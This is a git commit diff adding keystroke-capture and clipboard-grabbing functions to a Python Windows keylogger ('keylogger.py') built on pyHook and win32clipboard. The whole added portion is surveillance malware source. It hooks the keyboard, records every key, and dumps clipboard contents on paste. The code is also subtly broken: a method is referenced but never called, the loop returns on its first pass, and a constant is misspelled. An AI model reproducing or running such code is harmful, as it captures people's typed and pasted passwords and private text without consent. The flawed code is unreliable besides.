d035d1dc70224d3fa694fc08851010cdb5bda0b9
l0928h <l0928h@gmail.com>
2023-01-02 19:49:57 +0100

    modify keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -34,3 +34,40 @@ class KeyLogger:
 
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
+
+    def mykeystroke(self, event):
+        if event.WindowName != self.current_window:
+            self.get_current_process
+        if 32 < event.Ascii < 127:
+            print(chr(event.Ascii), end='')
+        else:
+            if event.Key == 'V':
+                win32clipboard.OpenClipboard()
+                value = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                print(f'[PASTE] - {value}')
+            else:
+                print(f'{event.Key}')
+        return True
+
+def run():
+    save_stdout = sys.stdout
+    sys.stdout = StringIO()
+
+    kl = KeyLogger()
+    hm = pyHook.HookManager()
+    hm.keyDown = kl.mykeystroke
+    hm.HookKeyboard()
+
+    while time.thread_time() < TIMOUT:
+        pythoncom.PumpWaitingMessages()
+        log = sys.stdout.getvalue()
+        sys.stdout = save_stdout
+        return log
+
+if __name__== '__main__':
+    print(run())
+    print('done.')
+    
+
+                
